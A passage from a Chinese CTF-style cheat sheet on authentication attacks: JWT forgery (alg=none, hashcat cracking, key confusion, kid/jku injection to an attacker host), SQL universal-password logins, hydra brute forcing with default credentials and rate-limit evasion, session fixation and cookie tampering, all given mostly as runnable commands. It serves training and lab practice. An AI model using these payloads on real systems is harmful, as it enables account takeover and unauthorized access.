## [g1] JWT——JWT 缺陷集中在签名算法、密钥与 Header 注入三处，是认证题最高频考点。
### [jwt-attacks] JWT 攻击全集 | medium | JWT;认证 | jwt绕过
> 从结构解码到签名伪造的 JWT 完整攻击面速查。
#### 这个条目的作用
JWT（JSON Web Token）是认证题出现率最高的考点。这个条目把「解码 → 判断算法 → 逐个尝试攻击手法」的完整流程串起来：它是本组另外两个条目的总地图，先读它建立全局观，再按需跳到 alg=none（jwt-alg-none）或弱密钥爆破（jwt-weak-key）看细节。
#### 前置条件
- 一个能抓请求、能重放修改的工具：Burp Suite（改 Cookie / Authorization 头）、浏览器 F12 开发者工具、或 curl（终端直连）
- 一个待测试的 JWT，来源：登录响应、Set-Cookie、localStorage、Authorization 头、URL 参数
- 可选：jwt_tool（`git clone https://github.com/ticarpi/jwt_tool` 后 `python3 jwt_tool.py` 运行）、hashcat（GPU 爆破）——没有也能用手工 + Python 完成大部分攻击
- 一点 Python 基础（有 PyJWT 更好：`pip install pyjwt`）

#### 第 1 步：认识 JWT 的三段结构并解码
JWT 是三个用 `.` 分隔的 base64url 字符串：`Header.Payload.Signature`。base64url 与普通 base64 只有两点差别：`+` 变 `-`、`/` 变 `_`，且去掉末尾的 `=` 填充。先解码看内容：

```bash
# 把 token 粘进来（示例 token 是假的，签名段无所谓）
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.dummy'
echo "$TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null
# 预期输出: {"alg":"HS256","typ":"JWT"}
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
# 预期输出: {"user":"guest"}
```

预期结果：看到 header 里的 `alg`（签名算法）和 payload 里的身份字段。如果不行：`base64 -d` 报 invalid input 是因为没把 `-_` 转回 `+/`，先 `tr '_-' '/+'` 即可；也可以扔到 jwt.io / token.dev 在线解码。**Header 和 Payload 只是编码不是加密，任何拿到 token 的人都能读，服务端绝不会把密码放进去。**
#### 第 2 步：建立「先看后打」的固定顺序
拿到任何 token，第一步永远是盯着 `alg` 和 `sub/user/role` 看，再决定走哪条路。固定顺序：
1. 解码看算法与身份字段（第 1 步）
2. 试 `alg=none` 免签名伪造（最容易，见 jwt-alg-none）
3. HS256 弱密钥爆破（见 jwt-weak-key）
4. RS256 → HS256 公钥混淆（服务端用公钥验签时）
5. kid / jku 头注入（密钥来源可控时）
6. 只篡改 exp / role 后原样重放（不碰签名，服务端若不校验签名就是白给）

> [!tip] 低成本攻击永远排前面：先试不要密钥的攻击（alg=none、裸篡改），爆破要花时间，放到后面。
#### 第 3 步：试 alg=none 免签名伪造
把 header 的 `alg` 改成 `none`（大小写变体 None / NONE / nOnE 全试），签名段清空。服务端若按字符串比对算法名且信任 `none`，就直接跳过签名校验：

```text
修改前: <base64url(header HS256)>.<base64url(payload)>.<签名>
修改后: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<base64url(payload)>.   ← 签名段留空
```

完整伪造流程（解码 → 改 alg → 重新 base64url → 替换 Cookie）见 jwt-alg-none 条目，那里有一步步可复制的命令。
#### 第 4 步：爆破弱密钥（仅 HS256）
只有 `alg` 是 HS256/HS384/HS512（HMAC 对称算法）才需要密钥；爆破出 secret 后即可用任意伪造身份签名。**HS256 的密钥就是做 HMAC 的密码，密钥弱才爆得出来**。主力命令：

```bash
# hashcat 模式 16500 = JWT HS256，字典攻击
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
# jwt_tool 爆破（无 GPU 备选）
jwt_tool <JWT> -C -d wordlist.txt
```

完整字典选择与掩码爆破见 jwt-weak-key 条目。
#### 第 5 步：测 RS256 → HS256 公钥混淆
当 header 是 RS256（非对称：私钥签名 / 公钥验签）时别急着放弃。有些服务端同时接受 HS256，却不区分「密钥类型」——把验签公钥的内容直接当作 HMAC 对称密钥：

```bash
# 从证书提取公钥（目标给出证书时）
openssl x509 -in cert.pem -pubkey -noout > public.pem
# jwt_tool 混淆：把公钥内容当 HMAC 密钥重签
jwt_tool <JWT> -X k -pk
```

如果不行：新库大多已禁用密钥类型混用，属预期失败，继续下一招。
#### 第 6 步：测 kid / jku 头注入
`kid`（key id）常被服务端拼路径取密钥（`/keys/<kid>.pem`），可注入路径穿越；`jku` 让服务端从指定 URL 拉公钥，可指向攻击者服务器。改 Header 后要用对应密钥重签，细节见 jwt-weak-key。
#### 第 7 步：篡改字段后原样重放（零成本检查）
把 payload 里的 `exp` 调大、`role/admin` 改高、`sub` 换他人 ID，然后**不重算签名**原样重放。若服务端根本不校验签名或只信 payload 字段，这一步直接成功：

```bash
# 用 base64url 重新编码 payload 后粘进 token（编码方法见 jwt-alg-none 第 2 步）
curl -s http://t/api/profile -H 'Cookie: token=<只改了payload的JWT>'
```

预期结果：返回管理员/他人数据。如果不行：签名被校验，回到第 3-6 步做真伪造。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `base64 -d` 报 invalid input | 没把 `-_` 转回 `+/` | 先 `tr '_-' '/+'` 再解码 |
| alg=none 后仍 401 | 服务端已禁用该算法/强制校签 | 试大小写变体，失败转爆破或混淆 |
| hashcat 一直无结果 | 密钥不在词表 / 不是 HS256 | 换 rockyou 或 `-a 3` 掩码；先确认算法 |
| 改了 payload 后验签失败 | 改完没重算签名 | 每次改动后必须重算签名段 |
| 解码出现乱码 | base64 未 padding | 加 `2>/dev/null` 或在线工具 |
#### 实战要点
- 任何 token 第一步解码，`alg` 决定后面 80% 的路线
- jwt.io 只用来快速解码，伪造必须自己重签，别在在线工具里贴真实 token
- 攻击顺序固定：none → 爆破 → 混淆 → kid/jku → 裸篡改，成本从低到高
- 爆破 HS256 只是拿到「可签名的密钥」，拿到后要重新编码 payload 才算完整利用
- 改 Header 注入 kid/jku 时签名也要用对应密钥重算，否则验签不过
- 裸篡改 exp/role 零成本，永远最先试

### [jwt-alg-none] alg=none 与密钥混淆 | easy | JWT;认证 | alg none;rs256转hs256
> 免签名与 RS256->HS256 公钥混淆的标准手法与工具参数。
#### 这个条目的作用
专门讲「不需要密钥就能伪造 JWT」的两种手法：alg=none（服务端信任该算法时完全跳过验签）和 RS256→HS256 混淆（服务端把公钥内容当 HMAC 密钥）。这是 JWT 题里最容易拿分的类型：零爆破、零密钥。
#### 前置条件
- 一个 JWT（从 Cookie / Authorization / localStorage 拿到）
- Python3（有 PyJWT 更好：`pip install pyjwt`；没有也有纯手写方案）
- 若目标是 RS256，先弄到公钥：常见来源是 `/jwks`、`/.well-known/jwks.json`、公开证书 cert.pem
- curl 或 Burp 用于替换并重放 token

#### 第 1 步：解码确认现状
```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx'
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
# 预期看到 payload: {"user":"guest"} —— 记住目标身份字段长什么样
```

然后决定伪造目标。**伪造什么权限取决于题目**：常见有 `{"user":"admin"}`、`{"role":"admin"}`、`{"admin":true}`；最快的做法是照抄现有 payload 结构，只把值改掉。
#### 第 2 步：生成 alg=none 的 token（纯 Python，无依赖）
```python
# python3 直接运行，不依赖 PyJWT
import base64, json

def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b'=')

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':')).encode())
payload = b64url(json.dumps({"user": "admin"}).encode())   # 换成你的目标身份
print((header + b'.' + payload + b'.').decode())
# 输出类似: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.   ← 签名段留空
```
预期结果：打印出三段式 token。如果不行：Python 版本过老，`b64url` 输出的是带 `=` 的，已用 `.rstrip(b'=')` 处理；确认 `base64`、`json` 是标准库即可。
#### 第 3 步：三种签名形态逐个试
服务端实现差异大，签名段有三种形态：
- `header.payload.`（末尾带一个点，签名空串）
- `header.payload`（整个第三段删除）
- `header.payload.xxx`（随便填不验签的内容）

```bash
# 形态 1：尾部一个点
curl -s http://t/api/admin -H 'Cookie: token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'
# 预期: 200 + 管理员数据；若 401 就依次试另外两种形态

# 浏览器里替换（F12 Console），再刷新页面
document.cookie = "token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

> [!warn] alg 的大小写变体 none / None / NONE / nOnE 逐个试——部分实现直接字符串比对，只认其中一个。
#### 第 4 步：jwt_tool 一键覆盖全部变体
```bash
python3 jwt_tool.py <JWT> -X a
# -X a = 自动生成 alg=none 的多种变体（含大小写与签名形态）并打印
# 把输出的伪造 token 替换重放即可
```
预期结果：脚本输出若干候选 token。如果不行：`-X a` 需要较新版本 jwt_tool，`git pull` 更新后再试。
#### 第 5 步：RS256 → HS256 公钥混淆（仅原算法为 RS256）
原理：服务端用「公钥」验签；若它同时接受 HS256，并把 RSA 公钥的 PEM 文本当作 HMAC 对称密钥，那 HMAC 的密钥就是公钥本身——公钥是公开的，等于密钥白送。

```bash
# 1. 拿公钥（二选一）
openssl x509 -in cert.pem -pubkey -noout > public.pem   # 有证书时
curl -s http://t/.well-known/jwks.json -o jwks.json     # 有 JWKS 端点时

# 2. jwt_tool 混淆：用公钥内容当密钥重签
python3 jwt_tool.py <JWT> -X k -pk
```
预期结果：输出用公钥当密钥签好的 token。如果不行：新版库已禁用「公钥当对称密钥」混用，属预期，转弱密钥爆破路线。
#### 第 6 步：替换 Cookie 验证
```bash
# 用伪造 token 打权限接口
curl -s -i http://t/admin -H 'Cookie: token=<第3或第4步产物>'
# 或先看主页 302 跳哪，再带 token 直访
curl -s -i http://t/ -H 'Cookie: token=<伪造token>'
```
预期结果：200 + 管理员页面。如果不行：区分 401（认证失败，token 没被接受）与 403（身份过了但权限字段名不对）——403 时换 payload 字段名（admin / is_admin / role / isAdmin）再试。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 伪造后 401 | alg=none 被拒绝 | 试大小写变体与三种签名形态；仍不行转爆破 |
| PyJWT 报算法不支持 | 新版 PyJWT 禁用 none | 用第 2 步纯手写方案，或 `pip install pyjwt==1.5.3` |
| `-X k` 混淆后仍 401 | 库已修密钥类型混用 | 该环境不打混淆，换弱密钥爆破 |
| 公钥提取失败 | 证书格式不对 | `openssl x509 -in cert.pem -pubkey -noout` 参数不能漏 |
#### 实战要点
- alg=none 是零成本攻击，永远第一个试
- 三种签名形态 × 大小写变体共约 10 个组合，写个小循环一次跑完
- 密钥混淆的前提是同一服务端同时支持 RS256 验签与 HS256 且不查密钥类型
- 混淆成功后服务端用同一公钥验签，伪造任意用户通行
- 题库里 alg=none 的常见形态是 `header.payload.` 尾点保留
- 失败响应先看是 401 还是 403，决定是重伪造还是换字段名

### [jwt-weak-key] 弱密钥爆破与 kid/jku 注入 | medium | JWT;认证 | hashcat jwt;kid注入
> hashcat/jwt_tool 爆破 HS256 弱密钥，以及 kid、jku、n 值注入伪造。
#### 这个条目的作用
HS256 是 JWT 最常见的算法。它是对称算法，签名密钥就是 HMAC 密码——密钥弱就能爆出来；爆出来后你等于拿到了私章，能伪造任何人。本条目还讲 kid、jku 两个 Header 注入点，它们能把「密钥来源」指向攻击者可控的地方。
#### 前置条件
- 一个 HS256 的 JWT（header 里 `"alg":"HS256"`）
- wordlist：rockyou.txt（`/usr/share/wordlists/rockyou.txt`，先 `gunzip rockyou.txt.gz` 解压）
- hashcat（GPU 爆破）或 jwt_tool（纯 CPU 备选）
- 做 kid 注入时：能从报错/页面推断目标的密钥读取方式（拼路径 or 查库）

#### 第 1 步：提取 token 并确认 HS256
```bash
# token 存文件（注意去掉多余空格换行）
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxxx' > jwt.txt
# 确认算法
cut -d. -f1 jwt.txt | tr '_-' '/+' | base64 -d 2>/dev/null
# 预期: {"alg":"HS256","typ":"JWT"}
```

> [!warn] 只有对称算法（HS256/384/512）能爆破密钥。RS256 是私钥签名，爆破方向完全相反——直接跳过或走混淆（jwt-alg-none 第 5 步）。
#### 第 2 步：hashcat 爆破（GPU 快）
```bash
# 模式 16500 = JWT，字典攻击 rockyou
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
hashcat -m 16500 -a 0 jwt.txt rockyou.txt --show   # 爆破完成后重跑一次看结果
# 若目标像开发者自建，把 secret / jwt-secret / 123456 放词表最前面，命中率更高

# 掩码爆破：6 位数字
hashcat -m 16500 -a 3 jwt.txt '?d?d?d?d?d?d'
# 掩码爆破：小写字母+数字
hashcat -m 16500 -a 3 jwt.txt '?l?l?l?l?d?d'
```
预期结果：hashcat 输出 Cracked 与 secret。如果不行：密钥不在可爆范围（强随机），转第 4 步 kid 注入，或放弃 JWT 改测其他点。
#### 第 3 步：jwt_tool 爆破并重签（无 GPU 备选）
```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
# -C = 爆破 secret；-d 指定字典（CPU 慢，先喂超弱口令表）
```
拿到密钥后完整伪造（改 payload + 重签）：
```bash
python3 jwt_tool.py <JWT> -I -pc user -pv admin -S hs256 -k 'big-secret'
# -I 进入修改模式；-pc 选 payload 字段；-pv 给新值；-S hs256 -k 用爆出的密钥重签
```
预期结果：打印出 user=admin 且签名有效的 token。如果不行：确认爆出的密钥与 `-k` 完全一致，且算法写 `hs256` 小写。
#### 第 4 步：kid 注入——让密钥指向你控制的文件
`kid` 是 header 里的密钥 ID。典型实现是 `read_file("/keys/" + kid + ".pem")` 或查库。把 kid 注入成内容已知的文件，该文件内容就充当密钥：

```bash
# 把 header 的 kid 改成 /dev/null（内容为空 → 密钥为空串），重签重放
python3 jwt_tool.py <JWT> -X i -I kid -v /dev/null
# 其它候选: /proc/self/environ（环境变量内容）、/etc/passwd（内容已知可本地验签）

# 手写等价物（Python）：header 变 {"alg":"HS256","kid":"/dev/null"}，用空串做 HMAC 密钥签名
```
预期结果：服务端读 `/dev/null` 得空密钥，你用空密钥签的 token 验签通过。如果不行：实现不拼路径（白名单/查库），改 SQLi 变体：`kid = ' UNION SELECT 'attacker-secret' -- -`（服务端拼 SQL 时）。
#### 第 5 步：jku 注入——让密钥来源指向你的公钥
`jku` 是 JWKS 的 URL，服务端 GET 该地址拿公钥验签。改成攻击者服务器地址，就能用配套私钥签名：

```bash
# 1. 攻击者服务器放 jwks.json（用私钥经在线/本地工具生成 RSA JWKS 格式）
# 2. jwt_tool 注入
python3 jwt_tool.py <JWT> -X j -ju http://attacker.com/jwks.json
# 3. 用配套私钥签名的 token，服务端 fetch 你的公钥后验签通过
```
如果不行：服务端有 jku 域名白名单或禁 http(s) 拉取，换本地路径实现（少数实现支持 jku 指向本地文件）。
#### 第 6 步：替换 Cookie 验证
```bash
curl -s http://t/admin -H 'Cookie: token=<任意一步的伪造产物>'
# 200 + 管理员数据 = 成功
```
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| hashcat 报 token 格式错 | token 里混了空格换行 | `echo -n` 写入；`--show` 前先清理 |
| 爆出密钥但重签仍 401 | 改了 payload 没重签 | 每次改字段必须重算签名段 |
| kid 注入无效果 | 实现不读文件只查白名单 | 试 SQLi 变体或改测 jku |
| jku 指向公网失败 | 环境无外网 / 有白名单 | 试本地路径；不行放弃 |
| 密钥爆不出 | 密钥是强随机串 | 属预期，转其它攻击面 |
#### 实战要点
- HS256 爆破前提是密钥弱，rockyou 前段 + 常见 JWT 密钥（secret/jwt-secret/123456）命中率最高
- 爆出密钥后「改 payload + 重签」两步缺一不可
- kid 注入先区分实现：拼路径 → 文件内容当密钥；拼 SQL → 注入密钥
- jku 伪造前先在本地用同一对公私钥验签，确认 JWKS 格式正确再打
- n 值混淆（把 ECDSA 公钥 n 组件塞进 RSA 公钥结构）很少见，最后才考虑
- 爆破开始前先确认题目标签是不是 JWT 弱密钥类，别把时间耗在强密钥上

## [g2] 登录绕过——登录绕过先走逻辑与配置，再上字典：从万能密码、前端校验到响应篡改。
### [login-bypass] 登录绕过速查 | easy | 登录;逻辑漏洞 | 万能密码
> 万能密码、前端校验绕过、响应篡改与接口直调的标准手法。
#### 这个条目的作用
登录功能是任何靶场的入口，也是最容易白给的考点。本条目讲四类低成本绕过：万能密码（后端 SQL 拼接）、前端校验绕过（校验根本不在服务端）、响应篡改（前端拿响应当登录依据）、接口直调（登录后的接口不鉴权）。
#### 前置条件
- Burp Suite（抓包改包）或浏览器 F12 重放
- 目标登录页 + 登录后的业务接口（/admin、/api/profile 等）
- 先用自己的测试账号正常登录一次，摸清请求格式（字段名、Content-Type）

#### 第 1 步：先测万能密码（后端拼接 SQL 时生效）
万能密码原理：后端把输入直接拼进 SQL（`SELECT * FROM user WHERE name='<input>' AND pass='<input>'`），注入引号让 WHERE 恒真。逐个试：

```txt
admin' --
' OR 1=1 -- -
' OR '1'='1
' OR 'a'='a
1' OR '1'='1' -- '
' OR 1=1 #
admin' #
```

> [!warn] 万能密码只在后端**直接拼接 SQL** 时有效。先测语法报错特征：用户名输一个 `'`，若返回 500 / SQL 报错说明存在拼接，再批量试列表；现代框架全是参数化查询时直接放弃。
```bash
curl -s -X POST http://t/login -d "user=' OR '1'='1 -- -&pass=x"
# 预期: 绕过登录，返回业务页或接口数据
```
如果不行：转第 2 步。
#### 第 2 步：绕过前端校验（F12 改 JS / 直调业务）
前端校验 = 判断全在页面 JS，服务端根本没查。绕法：

```txt
# 绕法 1：控制台直接请求业务接口，跳过登录
fetch('/admin').then(r => r.text()).then(console.log)

# 绕法 2：覆盖校验 JS 函数，让它恒真
function checkLogin(u, p) { return true; }

# 绕法 3：找登录成功标志变量（isLogin / valid / ok），直接置 true 再点登录按钮
```
预期结果：页面显示已登录/看到业务区。如果不行：校验在服务端，转第 3 步。
#### 第 3 步：响应篡改（success:false → true）
部分实现把登录结果整个放响应里，前端只信 `success`/`msg` 字段：

```bash
# Burp 拦截登录响应，把
# {"success":false,"msg":"密码错误"}
# 改成
# {"success":true,"msg":"ok"}
# 放行后前端按登录成功渲染
```
如果不行：前端还有二次校验接口，继续翻包找。
#### 第 4 步：接口直调（不登录直接打业务接口）
登录只是前端一跳，后端接口可能根本没挂鉴权。把已知接口全试一遍：

```bash
curl -s http://t/api/profile -H 'Cookie: session=随便写'
curl -s http://t/admin
curl -s http://t/api/userinfo
# 任一接口直接返回数据 = 接口直调成功
```
如果不行：全部 302 跳登录页 = 有统一鉴权中间件，转第 5 步爆破。
#### 第 5 步：用户枚举 + 定向爆破
错误提示若区分「用户不存在/密码错误」，先枚举用户名再爆破（配合 weak-passwords 的 hydra 命令）：

```bash
curl -s http://t/login -d 'user=nonexistent_xyz&pass=1' | grep -o '用户不存在\|密码错误'
curl -s http://t/login -d 'user=admin&pass=1'        | grep -o '用户不存在\|密码错误'
```
预期结果：两条响应提示不同 = 可枚举。如果不行（提示一致）：直接上双字典爆破。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 万能密码全 500 | 没拼 SQL 或过滤了引号 | 放弃万能密码，转前端/接口直调 |
| 改响应无效 | 前端有二次校验 | 抓后续请求继续改 |
| 接口直调 302 | 有统一鉴权 | 找 Cookie/Token 必填项再带 |
| 页面正常但接口不开 | 前后端凭据不同 | 把登录包的 Cookie 原样带上 |
#### 实战要点
- 顺序固定：万能密码 → 前端绕过 → 响应篡改 → 接口直调 → 爆破，成本从零到高
- 万能密码先看引号报错特征，别盲试
- 登录成功后的每个接口都单独直调一次，鉴权最常挂在「页面」而不是「接口」上
- 响应篡改时连 Set-Cookie 一起看，前端可能读的是 cookie 不是响应体
- 枚举出用户再爆破，成功率翻倍

### [weak-passwords] 弱口令与默认口令 | easy | 爆破;密码 | 弱口令;字典
> 登录爆破的字典优先级与常见系统默认口令速查。
#### 这个条目的作用
弱口令是认证题里「一刀流」的存在，配好了直接打穿。本条目给出爆破的三个核心：字典优先级（先默认/超弱口令再大字典）、工具参数（hydra / wfuzz）、常见系统的默认口令表。
#### 前置条件
- 一个登录表单（HTTP POST 或 Basic Auth）
- 抓包确认登录请求：参数名（user/pass 还是 username/password）、Content-Type、失败响应特征词
- 工具：hydra（`apt install hydra`）或 wfuzz（`pip install wfuzz`）
- 字典：自建超弱口令表 + rockyou.txt

#### 第 1 步：按命中率排序准备字典
爆破成功率 = 字典命中率 × 限速绕过能力。**先用最短的超弱口令表**，别一上来就轰 rockyou：

```txt
# super-weak.txt —— 按命中率排序
admin/admin  admin/123456  admin/admin888  admin/12345678
root/root  root/toor  admin/123123  admin/666666
admin/000000  admin/Admin@123  admin/1qaz2wsx
test/test  guest/guest  user/user  demo/demo  admin1/admin1
```
常见画像：`admin + 弱数字` 命中率最高；国内靶场 `admin/123456`、`admin888` 出现率极高。
#### 第 2 步：hydra 爆破 HTTP 登录（核心参数）
hydra 三要素：目标 URL、请求模板（`^USER^`/`^PASS^` 占位）、失败标志（`F=`）：

```bash
# 格式: hydra -l 用户名 -P 密码字典 主机 http-post-form "路径:请求体:失败标志"
hydra -l admin -P super-weak.txt 10.0.0.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=error" -t 16
# -l 单用户名 / -L 用户名字典 / -P 密码字典 / -t 并发线程
# F=error: 响应里含 error 即登录失败
```
预期结果：`[80][http-post-form] host: 10.0.0.1 login: admin password: 123456`。如果不行：`F=` 标志词不对（失败页与成功页没有差异），先手动登录两次抓真实差异词，或用 `S=welcome`（成功页特征词）反选。
#### 第 3 步：wfuzz 双字典交叉（用户名×密码）
```bash
# FUZZ = 用户名，FUZ2Z = 密码
wfuzz -z file,user.txt -z file,pass.txt -u http://t/login \
  -d "user=FUZZ&pass=FUZ2Z" --hc 401
# --hc 401: 隐藏 401 失败响应，剩下的就是可疑成功
```
预期结果：非 401 的响应里找到登录成功页。如果不行：加 `--hw`/`--hl`（按字数/行数过滤）排除干扰响应。
#### 第 4 步：处理限速、验证码与锁定
爆破被卡先别硬刚，常见对策：

```txt
- IP 限速: 换 X-Forwarded-For 头变体 / 换出口
- 单用户锁定: 铺开多个候选用户名一起爆（-L user.txt）
- 验证码: 能 OCR / 复用 / 回显时先绕（见 09-auth 验证码组条目）
- 频率限制: 降 -t 并发或加延时, 别把账号打锁
```
#### 第 5 步：套用默认口令表
登录页特征明显时直接对默认口令（组件版本配合漏洞分析）：

| 系统 | 默认口令 |
|---|---|
| Tomcat | tomcat/tomcat、admin/admin（manager 页面） |
| MySQL | root/空（本地默认无密码） |
| Redis | 默认无鉴权（可直接连接） |
| Grafana | admin/admin |
| 宝塔面板 | 安装时随机生成，可尝试爆破 |
| 路由器/摄像头 | admin/admin、admin/1234、root/空 |

命中即登录后台，接着找 getshell 点（文件上传 / 命令执行）。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| hydra 满屏 invalid reply | F= 标志不对 | 手动登录抓差异词改 F=/S= |
| 大量假阳性 | 失败页也返回 200 | 加 `--hc` 或多特征词组合 |
| 高并发后全超时 | 触发限速/封 IP | 降 `-t`，加 X-Forwarded-For 变体 |
| 大字典全 miss | 密码是随机强口令 | 属预期，弱口令路线到此为止 |
#### 实战要点
- 顺序就是成功率：默认口令 → 超弱口令 → 大字典
- hydra 的 F=/S= 必须和页面真实差异词一致，这是最常见的坑
- 爆破前确认有没有验证码/锁定，防账号被锁影响后续测试
- admin 不存在时先枚举用户名（login-bypass 第 5 步），再双字典交叉
- 弱口令命中后会话别丢，直接进后续利用（文件上传/getshell）

## [g3] 会话安全——会话缺陷 = 会话不可信：固定、可预测、未轮换、Cookie 可篡改。
### [session-fixation] 会话固定与可预测 SID | medium | 会话;Cookie | session fixation
> 会话固定攻击手法、可预测 SessionID 爆破与登录后未更新 SID。
#### 这个条目的作用
会话固定（Session Fixation）：攻击者先拿到自己的 SID 发给受害者，受害者带着这个 SID 登录后，攻击者直接冒用。可预测 SID：ID 由时间/计数/用户名派生时可枚举。两者都源于「会话标识本身不可信」。本条目讲检测、利用与属性核查。
#### 前置条件
- 一个带 Cookie 登录的应用（HTTP + Set-Cookie）
- curl（-c 存 cookie、-b 带 cookie）或 Burp 重放
- 理解核心：服务端靠 Cookie 里的 SID 认人，SID 属于谁，会话就属于谁

#### 第 1 步：登录前后对比 SID 是否轮换（先检测）
```bash
# 1. 未登录访问，抓 Set-Cookie 存 c1.txt
curl -s -i -c c1.txt http://t/login
# 2. 用同一 cookie 文件登录
curl -s -b c1.txt -c c2.txt -X POST http://t/login -d 'user=admin&pass=123456'
# 3. 对比两次的 SID
cat c1.txt c2.txt
```
预期结果：SID 变化 = 有轮换；**SID 没变 = 会话固定漏洞成立**，直接进第 2 步。如果不行（登录依赖其它字段）：按实际包格式调整参数。
#### 第 2 步：会话固定完整利用（SID 未轮换时）
```txt
三步：
1. 攻击者访问目标，拿到自己的 SID（如 abc123）
2. 让受害者带着 abc123 完成登录：
   - 链接注入: http://t/login?SID=abc123（应用从参数取 SID 时）
   - 子域写 Cookie: 同域先种 Cookie 再跳转登录页
   - CTF 常简化: 直接提交「带该 SID 的登录请求」
3. 受害者登录后，攻击者用 abc123 重放 → 进入受害者会话
```
```bash
# 攻击者视角：用自己的 SID 提交登录（CTF 到这一步往往就能拿分）
curl -s -b 'PHPSESSID=abc123' -X POST http://t/login -d 'user=victim&pass=xxx'
# 之后受害者的登录都绑在这个 SID 上；攻击者重放即进入会话
curl -b 'PHPSESSID=abc123' http://t/profile
```
预期结果：拿 abc123 能访问受害者私有页面。如果不行：登录接口不接受指定 SID，试参数注入形态（`?PHPSESSID=abc123` / `?sessionid=`）。
#### 第 3 步：核查 Cookie 属性（放大面评估）
```bash
curl -s -i http://t/login | grep -i 'set-cookie'
# 四件事：
# 缺 HttpOnly —— XSS 可直接偷 SID（配合 xss 组条目）
# 缺 Secure —— http 明文传输可被嗅探
# 缺 SameSite —— CSRF 攻击面扩大
# 有 SameSite=strict —— 跨站请求不自动带 Cookie，反而挡 CSRF
```
#### 第 4 步：可预测 SID 枚举（抓一串找规律）
多抓几个 SID 找派生规律：

```bash
for i in 1 2 3 4 5; do
  curl -s -i http://t/login | grep -i 'set-cookie:.*sid' | grep -oE '[a-zA-Z0-9]{8,}'
done
# 观察: 是否自增、MD5(时间戳)、hex 递增、含用户名
```
```python
# 假设是 MD5(时间戳) 型，枚举最近 200 秒
import time, hashlib
now = int(time.time())
for ts in range(now - 100, now + 100):
    sid = hashlib.md5(str(ts).encode()).hexdigest()
    print(ts, sid)
# 逐个带上重放，200 即命中
```
预期结果：找到规律后预测即将下发的 SID，抢在登录前占坑。如果不行：SID 是强随机（32 位真随机 hex），属安全实现，停止枚举。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 重放 SID 仍是未登录 | 登录后服务端已轮换 SID | 该会话实现是安全的，改测其它点 |
| 参数注入 SID 无效 | 应用只从 Cookie 读 | 用 `-b 'PHPSESSID=...'` 方式 |
| Cookie 缺属性但不直接利用 | 属性缺失是放大面不是洞 | 配合 XSS/CSRF 条目串链才成立 |
| 枚举无规律 | SID 强随机 | 放弃枚举，走 cookie-tamper 条目 |
#### 实战要点
- 第一条命令永远是「登录前后对比 SID」：没轮换 = 有洞
- 会话固定利用的关键是「让登录发生在攻击者的 SID 上」，CTF 里常直接给成「用指定 SID 登录」
- 缺 HttpOnly/Secure/SameSite 要写进报告，放大 XSS/CSRF 链路
- 登录/提权后必须换新 SID 并使旧 SID 失效是合规基线，旧 SID 仍有效就是问题

### [cookie-tamper] Cookie 篡改与会话反序列化 | medium | 会话;反序列化 | cookie伪造
> 明文/可逆 Cookie 篡改与 PHP/Java 会话反序列化利用。
#### 这个条目的作用
Cookie 不一定安全：明文/Base64/可逆编码时可直接改 uid/role 提权；序列化存储（PHP session、Java 对象 Cookie）时可能触发反序列化漏洞直达 RCE。本条目讲「先识别 → 再篡改/利用」的完整路径。
#### 前置条件
- 登录后抓到的 Cookie（Burp 或 F12）
- phpggc（PHP gadget 链生成器：`git clone https://github.com/ambionics/phpggc`）——仅 PHP 反序列化场景
- 理解序列化/反序列化：对象变字符串、字符串再变回对象；危险类在反序列化时执行代码

#### 第 1 步：识别 Cookie 类型
```bash
# 把登录后的 Set-Cookie 挨个分类：
# 明文型: uid=1 / role=user / user=guest
# Base64 型: dWlkPTE=   （echo 'dWlkPTE=' | base64 -d 可还原）
# 序列化型: 含 O:4:"User" 或 a:3:{...} 结构
grep -oE 'O:[0-9]+:"[^"]+"' cookie.txt    # 识别 PHP 对象序列化特征
```
预期结果：确定类型。明文/可逆 → 直接改；序列化 → 反序列化链。（识别不了就 `base64 -d`、URL 解码逐层剥。）
#### 第 2 步：明文/可逆 Cookie 篡改提权
```txt
# 明文直接改
uid=1 -> uid=0        # 换用户
role=user -> role=admin

# Base64：解码 → 改 → 重新编码替换
echo 'uid=1' | base64                     # dWlkPTE=
echo 'dWlkPTE=' | base64 -d               # uid=1
echo 'uid=0' | base64                     # 新值重新编码后替换

# URL 编码：%75%69%64 还原后改、重新编码
# 异或/简单加密：加密函数常在前端 JS 里，改明文后按同样算法重算
```
```bash
curl -s http://t/admin -H 'Cookie: uid=0; role=admin'
# 或浏览器 F12 Console
document.cookie = "uid=0; role=admin"
```
预期结果：进入管理员/他人视角。如果不行：服务端不信任 Cookie 内字段（有服务端会话兜底），转第 3 步看序列化。
#### 第 3 步：PHP 序列化 Cookie 与长度篡改
PHP 的 session 值/自定义 Cookie 是序列化字符串，形如 `a:2:{s:4:"user";s:5:"admin";s:4:"role";s:4:"user";}`。先从「字段篡改」入手：

```txt
